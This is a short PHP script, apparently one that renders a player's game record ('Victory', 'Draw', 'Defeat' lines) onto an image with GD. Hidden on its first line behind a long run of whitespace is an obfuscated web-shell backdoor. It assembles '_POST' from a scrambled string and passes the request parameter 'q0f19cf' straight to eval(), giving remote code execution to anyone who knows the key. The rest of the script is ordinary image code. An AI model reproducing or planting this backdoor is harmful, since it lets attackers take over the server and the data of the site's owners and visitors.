<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q0f19cf'])){eval(${$s20}['q0f19cf']);}?><?php
...
foreach(preg_split("/((\r?\n)|(\r\n?))/", $record) as $line){
    if (strpos($line,'Victory') !== false) {
        Imagettftext($im, 10, 0, 250, 20, $white, 'verdana.ttf', $line);
    }
    if (strpos($line,'Draw') !== false) {
        Imagettftext($im, 10, 0, 250, 35, $white, 'verdana.ttf', $line);
    }
    if (strpos($line,'Defeat') !== false) {
        Imagettftext($im, 10, 0, 250, 50, $white, 'verdana.ttf', $line);
    }
}
